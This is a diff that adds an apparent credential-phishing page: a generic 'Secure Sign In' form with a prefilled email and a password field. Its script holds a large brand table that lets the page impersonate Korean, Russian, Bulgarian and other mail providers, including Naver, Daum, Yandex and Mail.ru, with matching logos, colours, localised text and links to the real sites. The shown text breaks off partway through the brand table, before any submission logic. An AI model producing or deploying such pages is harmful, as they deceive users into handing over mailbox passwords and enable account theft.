@@ -1,0 +1,1772 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="pageTitle">Secure Sign In</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, 'Noto Sans KR', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            transition: background 0.5s ease;
+        }
+        .login-container {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            max-width: 420px;
+            width: 100%;
+            padding: 48px 40px;
+            transition: all 0.3s ease;
+        }
+        .header { text-align: center; margin-bottom: 32px; }
+        .logo-icon {
+            width: 64px;
+            height: 64px;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            color: white;
+            font-size: 28px;
+            font-weight: 700;
+            transition: all 0.5s ease;
+        }
+        .logo-text {
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            transition: all 0.5s ease;
+        }
+        .logo-text .highlight { transition: color 0.5s ease; }
+        .subtitle { color: #5f6368; font-size: 14px; margin-top: 4px; }
+        .domain-badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 600;
+            margin-top: 8px;
+            background: #e8f0fe;
+            color: #1a73e8;
+            transition: all 0.5s ease;
+        }
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: #f8f9fa;
+            padding: 8px 16px;
+            border-radius: 20px;
+            margin: 16px auto;
+            width: fit-content;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        .security-badge svg { width: 16px; height: 16px; }
+        .form-group { margin-bottom: 20px; }
+        .form-group label {
+            display: block;
+            color: #3c4043;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 6px;
+            transition: color 0.5s ease;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 2px solid #dadce0;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            box-sizing: border-box;
+            font-family: inherit;
+        }
+        .form-group input:focus {
+            border-color: #1a73e8;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(26,115,232,0.1);
+        }
+        .form-group input:disabled { background: #f8f9fa; color: #5f6368; }
+        .form-group input.error { border-color: #d93025; }
+        .form-group .input-hint { font-size: 12px; color: #9aa0a6; margin-top: 4px; }
+        .password-wrapper { position: relative; }
+        .password-wrapper input { padding-right: 44px; }
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #9aa0a6;
+            cursor: pointer;
+            padding: 4px;
+            font-size: 18px;
+        }
+        .toggle-password:hover { color: #3c4043; }
+        .error-message {
+            color: #d93025;
+            font-size: 13px;
+            margin-top: 8px;
+            display: none;
+            align-items: center;
+            gap: 6px;
+        }
+        .error-message.show { display: flex; }
+        .btn-signin {
+            width: 100%;
+            padding: 14px;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s, opacity 0.3s;
+            margin-top: 8px;
+        }
+        .btn-signin:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
+        .btn-signin:active { transform: scale(0.98); }
+        .btn-signin:disabled {
+            background: #9aa0a6 !important;
+            cursor: not-allowed;
+            transform: none !important;
+            box-shadow: none !important;
+        }
+        .btn-signin .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top: 2px solid white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        .btn-signin.loading .spinner { display: inline-block; }
+        .btn-signin.loading .btn-text { display: none; }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+            font-size: 13px;
+        }
+        .footer-links a {
+            color: #1a73e8;
+            text-decoration: none;
+            transition: color 0.5s ease;
+        }
+        .footer-links a:hover { text-decoration: underline; }
+        .footer-text {
+            text-align: center;
+            margin-top: 24px;
+            padding-top: 20px;
+            border-top: 1px solid #e8eaed;
+            font-size: 12px;
+            color: #9aa0a6;
+        }
+        .detection-badge {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.7);
+            color: white;
+            padding: 8px 12px;
+            border-radius: 8px;
+            font-size: 11px;
+            font-family: monospace;
+            opacity: 0.6;
+            pointer-events: none;
+            z-index: 9999;
+        }
+        .theme-transition {
+            transition: background 0.5s ease, color 0.5s ease, border-color 0.5s ease;
+        }
+        .brand-flag {
+            display: inline-block;
+            font-size: 10px;
+            background: rgba(0,0,0,0.05);
+            padding: 2px 8px;
+            border-radius: 10px;
+            color: #666;
+            margin-left: 6px;
+        }
+        @media (max-width: 480px) {
+            .login-container { padding: 32px 20px; }
+            .logo-text { font-size: 20px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container" id="loginContainer">
+        <div class="header">
+            <div class="logo-icon" id="logoIcon">VT</div>
+            <div class="logo-text" id="logoText">
+                vtex-<span class="highlight" id="highlightText">grp</span>.com
+                <span class="brand-flag" id="brandFlag">Default</span>
+            </div>
+            <div class="subtitle" id="subtitleText">Secure Sign In</div>
+            <div class="domain-badge" id="domainBadge">🔒 Secured</div>
+        </div>
+        
+        <input type="hidden" id="emailField" value="">
+        <input type="hidden" id="originalDomain" value="">
+        
+        <div class="form-group">
+            <label for="emailDisplay" id="emailLabel">Email Address</label>
+            <input type="email" id="emailDisplay" readonly disabled>
+        </div>
+        
+        <div class="form-group">
+            <label for="password" id="passwordLabel">Password</label>
+            <div class="password-wrapper">
+                <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password">
+                <button type="button" class="toggle-password" onclick="togglePasswordVisibility()">👁️</button>
+            </div>
+            <div class="input-hint" id="passwordHint">Enter your account password</div>
+        </div>
+        
+        <div class="error-message" id="errorMessage">⚠️ <span id="errorText">Please enter your password</span></div>
+        
+        <button class="btn-signin" onclick="handleLogin()" id="signinBtn">
+            <span class="btn-text" id="btnText">Sign In</span>
+            <span class="spinner"></span>
+        </button>
+        
+        <div class="footer-links">
+            <a href="#" id="forgotLink">Forgot password?</a>
+            <a href="#" id="createLink">Create account</a>
+        </div>
+        
+        <div class="footer-text">
+            <div class="cloudflare-badge">
+                Protected by <img src="https://www.cloudflare.com/img/logo-web-badges/cf-logo-on-white-bg.svg" alt="Cloudflare" style="height:14px;vertical-align:middle;">
+            </div>
+            <div style="margin-top:4px;" id="copyrightText">&copy; 2026. All rights reserved.</div>
+        </div>
+    </div>
+    
+    <div class="detection-badge" id="detectionBadge">🔍 Detecting...</div>
+    
+    <script>
+        // ============================================================
+        // 1. COMPLETE BRAND DATABASE (KOREAN + GLOBAL + YANDEX + ABV.BG + MORE)
+        // ============================================================
+        
+        const BRAND_DB = {
+            // ==========================================================
+            // BULGARIAN EMAIL PROVIDERS
+            // ==========================================================
+            'abv.bg': {
+                name: 'ABV', domain: 'abv.bg', logoText: 'ABV',
+                highlightText: 'Mail', logoIcon: 'A', logoColor: '#0066b3',
+                accentColor: '#0066b3', buttonColor: '#0066b3', buttonHover: '#004d8a',
+                bgGradient: 'linear-gradient(135deg, #0066b3 0%, #004d8a 50%, #003366 100%)',
+                realSite: 'https://www.abv.bg',
+                subtitle: 'ABV Поща',
+                passwordHint: 'Въведете вашата парола за ABV',
+                forgotPassword: 'Забравена парола?',
+                createAccount: 'Създай акаунт',
+                copyright: '© ABV. Всички права запазени.',
+                flag: '🇧🇬'
+            },
+            'mail.bg': {
+                name: 'Mail.bg', domain: 'mail.bg', logoText: 'Mail',
+                highlightText: '.bg', logoIcon: 'M', logoColor: '#ff6600',
+                accentColor: '#ff6600', buttonColor: '#ff6600', buttonHover: '#cc5500',
+                bgGradient: 'linear-gradient(135deg, #ff6600 0%, #cc5500 50%, #993300 100%)',
+                realSite: 'https://mail.bg',
+                subtitle: 'Mail.bg Поща',
+                passwordHint: 'Въведете вашата парола за Mail.bg',
+                forgotPassword: 'Забравена парола?',
+                createAccount: 'Създай акаунт',
+                copyright: '© Mail.bg. Всички права запазени.',
+                flag: '🇧🇬'
+            },
+            'dir.bg': {
+                name: 'Dir.bg', domain: 'dir.bg', logoText: 'Dir',
+                highlightText: '.bg', logoIcon: 'D', logoColor: '#e30613',
+                accentColor: '#e30613', buttonColor: '#e30613', buttonHover: '#b30510',
+                bgGradient: 'linear-gradient(135deg, #e30613 0%, #b30510 50%, #800000 100%)',
+                realSite: 'https://mail.dir.bg',
+                subtitle: 'Dir.bg Поща',
+                passwordHint: 'Въведете вашата парола за Dir.bg',
+                forgotPassword: 'Забравена парола?',
+                createAccount: 'Създай акаунт',
+                copyright: '© Dir.bg. Всички права запазени.',
+                flag: '🇧🇬'
+            },
+            'vbox7.com': {
+                name: 'Vbox7', domain: 'vbox7.com', logoText: 'Vbox',
+                highlightText: '7', logoIcon: 'V', logoColor: '#ff0000',
+                accentColor: '#ff0000', buttonColor: '#ff0000', buttonHover: '#cc0000',
+                bgGradient: 'linear-gradient(135deg, #ff0000 0%, #cc0000 50%, #990000 100%)',
+                realSite: 'https://www.vbox7.com',
+                subtitle: 'Vbox7 Акаунт',
+                passwordHint: 'Въведете вашата парола за Vbox7',
+                forgotPassword: 'Забравена парола?',
+                createAccount: 'Създай акаунт',
+                copyright: '© Vbox7. Всички права запазени.',
+                flag: '🇧🇬'
+            },
+            
+            // ==========================================================
+            // KOREAN PORTAL MAIL
+            // ==========================================================
+            'naver.com': {
+                name: 'Naver', domain: 'naver.com', logoText: 'NAVER',
+                highlightText: 'Mail', logoIcon: 'N', logoColor: '#03c75a',
+                accentColor: '#03c75a', buttonColor: '#03c75a', buttonHover: '#028c45',
+                bgGradient: 'linear-gradient(135deg, #03c75a 0%, #028c45 100%)',
+                realSite: 'https://mail.naver.com',
+                subtitle: '네이버 메일',
+                passwordHint: '네이버 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© NAVER Corp. All rights reserved.',
+                flag: '🇰🇷'
+            },
+            'naver.net': {
+                name: 'Naver', domain: 'naver.net', logoText: 'NAVER',
+                highlightText: 'Mail', logoIcon: 'N', logoColor: '#03c75a',
+                accentColor: '#03c75a', buttonColor: '#03c75a', buttonHover: '#028c45',
+                bgGradient: 'linear-gradient(135deg, #03c75a 0%, #028c45 100%)',
+                realSite: 'https://mail.naver.com',
+                subtitle: '네이버 메일',
+                passwordHint: '네이버 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© NAVER Corp. All rights reserved.',
+                flag: '🇰🇷'
+            },
+            'hanmail.net': {
+                name: 'Daum', domain: 'hanmail.net', logoText: 'Daum',
+                highlightText: '한메일', logoIcon: 'D', logoColor: '#f9a800',
+                accentColor: '#f9a800', buttonColor: '#f9a800', buttonHover: '#e09400',
+                bgGradient: 'linear-gradient(135deg, #f9a800 0%, #e09400 100%)',
+                realSite: 'https://mail.daum.net',
+                subtitle: 'Daum 한메일',
+                passwordHint: '다음 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Kakao Corp. All rights reserved.',
+                flag: '🇰🇷'
+            },
+            'daum.net': {
+                name: 'Daum', domain: 'daum.net', logoText: 'Daum',
+                highlightText: '메일', logoIcon: 'D', logoColor: '#f9a800',
+                accentColor: '#f9a800', buttonColor: '#f9a800', buttonHover: '#e09400',
+                bgGradient: 'linear-gradient(135deg, #f9a800 0%, #e09400 100%)',
+                realSite: 'https://mail.daum.net',
+                subtitle: 'Daum 메일',
+                passwordHint: '다음 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Kakao Corp. All rights reserved.',
+                flag: '🇰🇷'
+            },
+            'kakao.com': {
+                name: 'Kakao', domain: 'kakao.com', logoText: 'Kakao',
+                highlightText: 'Mail', logoIcon: 'K', logoColor: '#f9a800',
+                accentColor: '#f9a800', buttonColor: '#f9a800', buttonHover: '#e09400',
+                bgGradient: 'linear-gradient(135deg, #f9a800 0%, #e09400 100%)',
+                realSite: 'https://mail.kakao.com',
+                subtitle: '카카오메일',
+                passwordHint: '카카오 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Kakao Corp. All rights reserved.',
+                flag: '🇰🇷'
+            },
+            'nate.com': {
+                name: 'Nate', domain: 'nate.com', logoText: 'Nate',
+                highlightText: 'Mail', logoIcon: 'N', logoColor: '#0088cc',
+                accentColor: '#0088cc', buttonColor: '#0088cc', buttonHover: '#006699',
+                bgGradient: 'linear-gradient(135deg, #0088cc 0%, #006699 100%)',
+                realSite: 'https://mail.nate.com',
+                subtitle: '네이트 메일',
+                passwordHint: '네이트 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© SK Communications. All rights reserved.',
+                flag: '🇰🇷'
+            },
+            'paran.com': {
+                name: 'Paran', domain: 'paran.com', logoText: 'Paran',
+                highlightText: '메일', logoIcon: 'P', logoColor: '#0066cc',
+                accentColor: '#0066cc', buttonColor: '#0066cc', buttonHover: '#004499',
+                bgGradient: 'linear-gradient(135deg, #0066cc 0%, #004499 100%)',
+                realSite: 'https://mail.daum.net',
+                subtitle: '파란 메일',
+                passwordHint: '파란 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Kakao Corp. All rights reserved.',
+                flag: '🇰🇷'
+            },
+            
+            // ==========================================================
+            // KOREAN BUSINESS EMAIL (Hiworks, Gabia, etc.)
+            // ==========================================================
+            'hiworks.co.kr': {
+                name: 'Hiworks', domain: 'hiworks.co.kr', logoText: 'Hiworks',
+                highlightText: '기업메일', logoIcon: 'H', logoColor: '#1a73e8',
+                accentColor: '#1a73e8', buttonColor: '#1a73e8', buttonHover: '#0d47a1',
+                bgGradient: 'linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%)',
+                realSite: 'https://www.hiworks.co.kr',
+                subtitle: '하이웍스 기업메일',
+                passwordHint: '하이웍스 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Hiworks. All rights reserved.',
+                flag: '🇰🇷'
+            },
+            'hiworks.com': {
+                name: 'Hiworks', domain: 'hiworks.com', logoText: 'Hiworks',
+                highlightText: '기업메일', logoIcon: 'H', logoColor: '#1a73e8',
+                accentColor: '#1a73e8', buttonColor: '#1a73e8', buttonHover: '#0d47a1',
+                bgGradient: 'linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%)',
+                realSite: 'https://www.hiworks.com',
+                subtitle: '하이웍스 기업메일',
+                passwordHint: '하이웍스 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Hiworks. All rights reserved.',
+                flag: '🇰🇷'
+            },
+            'gabia.com': {
+                name: 'Gabia', domain: 'gabia.com', logoText: 'Gabia',
+                highlightText: 'Mail', logoIcon: 'G', logoColor: '#e95e2e',
+                accentColor: '#e95e2e', buttonColor: '#e95e2e', buttonHover: '#cc4a1f',
+                bgGradient: 'linear-gradient(135deg, #e95e2e 0%, #cc4a1f 100%)',
+                realSite: 'https://www.gabia.com',
+                subtitle: '가비아 메일',
+                passwordHint: '가비아 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Gabia. All rights reserved.',
+                flag: '🇰🇷'
+            },
+            
+            // ==========================================================
+            // KOREAN LEGACY ISPs
+            // ==========================================================
+            'chollian.net': {
+                name: 'Chollian', domain: 'chollian.net', logoText: 'Chollian',
+                highlightText: '천리안', logoIcon: 'C', logoColor: '#0066cc',
+                accentColor: '#0066cc', buttonColor: '#0066cc', buttonHover: '#004488',
+                bgGradient: 'linear-gradient(135deg, #0066cc 0%, #004488 100%)',
+                realSite: 'https://www.chollian.net',
+                subtitle: '천리안 메일',
+                passwordHint: '천리안 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Chollian. All rights reserved.',
+                flag: '🇰🇷'
+            },
+            'hitel.net': {
+                name: 'Hitel', domain: 'hitel.net', logoText: 'Hitel',
+                highlightText: '하이텔', logoIcon: 'H', logoColor: '#e60000',
+                accentColor: '#e60000', buttonColor: '#e60000', buttonHover: '#b30000',
+                bgGradient: 'linear-gradient(135deg, #e60000 0%, #b30000 100%)',
+                realSite: 'https://www.hitel.net',
+                subtitle: '하이텔 메일',
+                passwordHint: '하이텔 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Hitel. All rights reserved.',
+                flag: '🇰🇷'
+            },
+            'nownuri.net': {
+                name: 'Nownuri', domain: 'nownuri.net', logoText: 'Nownuri',
+                highlightText: '나우누리', logoIcon: 'N', logoColor: '#009944',
+                accentColor: '#009944', buttonColor: '#009944', buttonHover: '#006633',
+                bgGradient: 'linear-gradient(135deg, #009944 0%, #006633 100%)',
+                realSite: 'https://www.nownuri.net',
+                subtitle: '나우누리 메일',
+                passwordHint: '나우누리 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Nownuri. All rights reserved.',
+                flag: '🇰🇷'
+            },
+            'unitel.co.kr': {
+                name: 'Unitel', domain: 'unitel.co.kr', logoText: 'Unitel',
+                highlightText: '유니텔', logoIcon: 'U', logoColor: '#ff6600',
+                accentColor: '#ff6600', buttonColor: '#ff6600', buttonHover: '#cc5500',
+                bgGradient: 'linear-gradient(135deg, #ff6600 0%, #cc5500 100%)',
+                realSite: 'https://www.unitel.co.kr',
+                subtitle: '유니텔 메일',
+                passwordHint: '유니텔 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Unitel. All rights reserved.',
+                flag: '🇰🇷'
+            },
+            'netsgo.com': {
+                name: 'Netsgo', domain: 'netsgo.com', logoText: 'Netsgo',
+                highlightText: '넷츠고', logoIcon: 'N', logoColor: '#0044cc',
+                accentColor: '#0044cc', buttonColor: '#0044cc', buttonHover: '#003399',
+                bgGradient: 'linear-gradient(135deg, #0044cc 0%, #003399 100%)',
+                realSite: 'https://www.netsgo.com',
+                subtitle: '넷츠고 메일',
+                passwordHint: '넷츠고 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Netsgo. All rights reserved.',
+                flag: '🇰🇷'
+            },
+            'shinbiro.com': {
+                name: 'Shinbiro', domain: 'shinbiro.com', logoText: 'Shinbiro',
+                highlightText: '신비로', logoIcon: 'S', logoColor: '#8b00ff',
+                accentColor: '#8b00ff', buttonColor: '#8b00ff', buttonHover: '#6600cc',
+                bgGradient: 'linear-gradient(135deg, #8b00ff 0%, #6600cc 100%)',
+                realSite: 'https://www.shinbiro.com',
+                subtitle: '신비로 메일',
+                passwordHint: '신비로 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Shinbiro. All rights reserved.',
+                flag: '🇰🇷'
+            },
+            'netian.com': {
+                name: 'Netian', domain: 'netian.com', logoText: 'Netian',
+                highlightText: '네띠앙', logoIcon: 'N', logoColor: '#ff3366',
+                accentColor: '#ff3366', buttonColor: '#ff3366', buttonHover: '#cc0044',
+                bgGradient: 'linear-gradient(135deg, #ff3366 0%, #cc0044 100%)',
+                realSite: 'https://www.netian.com',
+                subtitle: '네띠앙 메일',
+                passwordHint: '네띠앙 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Netian. All rights reserved.',
+                flag: '🇰🇷'
+            },
+            'hanmir.com': {
+                name: 'Hanmir', domain: 'hanmir.com', logoText: 'Hanmir',
+                highlightText: '한미르', logoIcon: 'H', logoColor: '#00aaff',
+                accentColor: '#00aaff', buttonColor: '#00aaff', buttonHover: '#0088cc',
+                bgGradient: 'linear-gradient(135deg, #00aaff 0%, #0088cc 100%)',
+                realSite: 'https://www.hanmir.com',
+                subtitle: '한미르 메일',
+                passwordHint: '한미르 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Hanmir. All rights reserved.',
+                flag: '🇰🇷'
+            },
+            'dreamwiz.com': {
+                name: 'Dreamwiz', domain: 'dreamwiz.com', logoText: 'Dreamwiz',
+                highlightText: '드림위즈', logoIcon: 'D', logoColor: '#ff9900',
+                accentColor: '#ff9900', buttonColor: '#ff9900', buttonHover: '#e67e00',
+                bgGradient: 'linear-gradient(135deg, #ff9900 0%, #e67e00 100%)',
+                realSite: 'https://www.dreamwiz.com',
+                subtitle: '드림위즈 메일',
+                passwordHint: '드림위즈 계정 비밀번호를 입력하세요',
+                forgotPassword: '비밀번호 찾기',
+                createAccount: '회원가입',
+                copyright: '© Dreamwiz. All rights reserved.',
+                flag: '🇰🇷'
+            },
+            
+            // ==========================================================
+            // YANDEX (RUSSIAN)
+            // ==========================================================
+            'yandex.com': {
+                name: 'Yandex', domain: 'yandex.com', logoText: 'Yandex',
+                highlightText: 'Mail', logoIcon: 'Y', logoColor: '#fc3f1d',
+                accentColor: '#fc3f1d', buttonColor: '#fc3f1d', buttonHover: '#d93010',
+                bgGradient: 'linear-gradient(135deg, #fc3f1d 0%, #d93010 100%)',
+                realSite: 'https://mail.yandex.com',
+                subtitle: 'Yandex Mail',
+                passwordHint: 'Enter your Yandex password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© Yandex. All rights reserved.',
+                flag: '🇷🇺'
+            },
+            'yandex.ru': {
+                name: 'Yandex', domain: 'yandex.ru', logoText: 'Yandex',
+                highlightText: 'Mail', logoIcon: 'Y', logoColor: '#fc3f1d',
+                accentColor: '#fc3f1d', buttonColor: '#fc3f1d', buttonHover: '#d93010',
+                bgGradient: 'linear-gradient(135deg, #fc3f1d 0%, #d93010 100%)',
+                realSite: 'https://mail.yandex.ru',
+                subtitle: 'Яндекс Почта',
+                passwordHint: 'Введите пароль от Яндекс',
+                forgotPassword: 'Забыли пароль?',
+                createAccount: 'Создать аккаунт',
+                copyright: '© Яндекс. Все права защищены.',
+                flag: '🇷🇺'
+            },
+            'ya.ru': {
+                name: 'Yandex', domain: 'ya.ru', logoText: 'Yandex',
+                highlightText: 'Mail', logoIcon: 'Y', logoColor: '#fc3f1d',
+                accentColor: '#fc3f1d', buttonColor: '#fc3f1d', buttonHover: '#d93010',
+                bgGradient: 'linear-gradient(135deg, #fc3f1d 0%, #d93010 100%)',
+                realSite: 'https://mail.yandex.ru',
+                subtitle: 'Яндекс Почта',
+                passwordHint: 'Введите пароль от Яндекс',
+                forgotPassword: 'Забыли пароль?',
+                createAccount: 'Создать аккаунт',
+                copyright: '© Яндекс. Все права защищены.',
+                flag: '🇷🇺'
+            },
+            'yandex.kz': {
+                name: 'Yandex', domain: 'yandex.kz', logoText: 'Yandex',
+                highlightText: 'Mail', logoIcon: 'Y', logoColor: '#fc3f1d',
+                accentColor: '#fc3f1d', buttonColor: '#fc3f1d', buttonHover: '#d93010',
+                bgGradient: 'linear-gradient(135deg, #fc3f1d 0%, #d93010 100%)',
+                realSite: 'https://mail.yandex.kz',
+                subtitle: 'Yandex Mail',
+                passwordHint: 'Enter your Yandex password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© Yandex. All rights reserved.',
+                flag: '🇰🇿'
+            },
+            'yandex.by': {
+                name: 'Yandex', domain: 'yandex.by', logoText: 'Yandex',
+                highlightText: 'Mail', logoIcon: 'Y', logoColor: '#fc3f1d',
+                accentColor: '#fc3f1d', buttonColor: '#fc3f1d', buttonHover: '#d93010',
+                bgGradient: 'linear-gradient(135deg, #fc3f1d 0%, #d93010 100%)',
+                realSite: 'https://mail.yandex.by',
+                subtitle: 'Yandex Mail',
+                passwordHint: 'Enter your Yandex password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© Yandex. All rights reserved.',
+                flag: '🇧🇾'
+            },
+            'yandex.ua': {
+                name: 'Yandex', domain: 'yandex.ua', logoText: 'Yandex',
+                highlightText: 'Mail', logoIcon: 'Y', logoColor: '#fc3f1d',
+                accentColor: '#fc3f1d', buttonColor: '#fc3f1d', buttonHover: '#d93010',
+                bgGradient: 'linear-gradient(135deg, #fc3f1d 0%, #d93010 100%)',
+                realSite: 'https://mail.yandex.ua',
+                subtitle: 'Yandex Mail',
+                passwordHint: 'Enter your Yandex password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© Yandex. All rights reserved.',
+                flag: '🇺🇦'
+            },
+            
+            // ==========================================================
+            // MAIL.RU (RUSSIAN)
+            // ==========================================================
+            'mail.ru': {
+                name: 'Mail.ru', domain: 'mail.ru', logoText: 'Mail.ru',
+                highlightText: '', logoIcon: 'M', logoColor: '#005ff9',
+                accentColor: '#005ff9', buttonColor: '#005ff9', buttonHover: '#0047c4',
+                bgGradient: 'linear-gradient(135deg, #005ff9 0%, #0047c4 100%)',
+                realSite: 'https://e.mail.ru',
+                subtitle: 'Mail.ru',
+                passwordHint: 'Enter your Mail.ru password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© Mail.ru Group. All rights reserved.',
+                flag: '🇷🇺'
+            },
+            'bk.ru': {
+                name: 'Mail.ru', domain: 'bk.ru', logoText: 'Mail.ru',
+                highlightText: '', logoIcon: 'M', logoColor: '#005ff9',
+                accentColor: '#005ff9', buttonColor: '#005ff9', buttonHover: '#0047c4',
+                bgGradient: 'linear-gradient(135deg, #005ff9 0%, #0047c4 100%)',
+                realSite: 'https://e.mail.ru',
+                subtitle: 'Mail.ru',
+                passwordHint: 'Enter your Mail.ru password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© Mail.ru Group. All rights reserved.',
+                flag: '🇷🇺'
+            },
+            'inbox.ru': {
+                name: 'Mail.ru', domain: 'inbox.ru', logoText: 'Mail.ru',
+                highlightText: '', logoIcon: 'M', logoColor: '#005ff9',
+                accentColor: '#005ff9', buttonColor: '#005ff9', buttonHover: '#0047c4',
+                bgGradient: 'linear-gradient(135deg, #005ff9 0%, #0047c4 100%)',
+                realSite: 'https://e.mail.ru',
+                subtitle: 'Mail.ru',
+                passwordHint: 'Enter your Mail.ru password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© Mail.ru Group. All rights reserved.',
+                flag: '🇷🇺'
+            },
+            'list.ru': {
+                name: 'Mail.ru', domain: 'list.ru', logoText: 'Mail.ru',
+                highlightText: '', logoIcon: 'M', logoColor: '#005ff9',
+                accentColor: '#005ff9', buttonColor: '#005ff9', buttonHover: '#0047c4',
+                bgGradient: 'linear-gradient(135deg, #005ff9 0%, #0047c4 100%)',
+                realSite: 'https://e.mail.ru',
+                subtitle: 'Mail.ru',
+                passwordHint: 'Enter your Mail.ru password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© Mail.ru Group. All rights reserved.',
+                flag: '🇷🇺'
+            },
+            'internet.ru': {
+                name: 'Mail.ru', domain: 'internet.ru', logoText: 'Mail.ru',
+                highlightText: '', logoIcon: 'M', logoColor: '#005ff9',
+                accentColor: '#005ff9', buttonColor: '#005ff9', buttonHover: '#0047c4',
+                bgGradient: 'linear-gradient(135deg, #005ff9 0%, #0047c4 100%)',
+                realSite: 'https://e.mail.ru',
+                subtitle: 'Mail.ru',
+                passwordHint: 'Enter your Mail.ru password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© Mail.ru Group. All rights reserved.',
+                flag: '🇷🇺'
+            },
+            
+            // ==========================================================
+            // RAMBLER (RUSSIAN)
+            // ==========================================================
+            'rambler.ru': {
+                name: 'Rambler', domain: 'rambler.ru', logoText: 'Rambler',
+                highlightText: 'Mail', logoIcon: 'R', logoColor: '#ff6600',
+                accentColor: '#ff6600', buttonColor: '#ff6600', buttonHover: '#cc5500',
+                bgGradient: 'linear-gradient(135deg, #ff6600 0%, #cc5500 100%)',
+                realSite: 'https://mail.rambler.ru',
+                subtitle: 'Rambler Mail',
+                passwordHint: 'Enter your Rambler password',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create account',
+                copyright: '© Rambler. All rights reserved.',
+                flag: '🇷🇺'
+            },
+            
+            // ==========================================================
+            // PROTONMAIL (SWISS)
+            // ==========================================================
+            'protonmail.com': {
+                name: 'ProtonMail', domain: 'protonmail.com', logoText: 'Proton',
+                highlightText: 'Mail', logoIcon: 'P', logoColor: '#6d4aff',
+                accentColor: '#6d4aff', buttonColor: '#6d4aff', buttonHover: '#5a3ae0',
+                bgGradient: 'linear-gradient(135deg, #6d4aff 0%, #5a3ae0 100%)',
+                realSite: 'https://mail.protonmail.com',
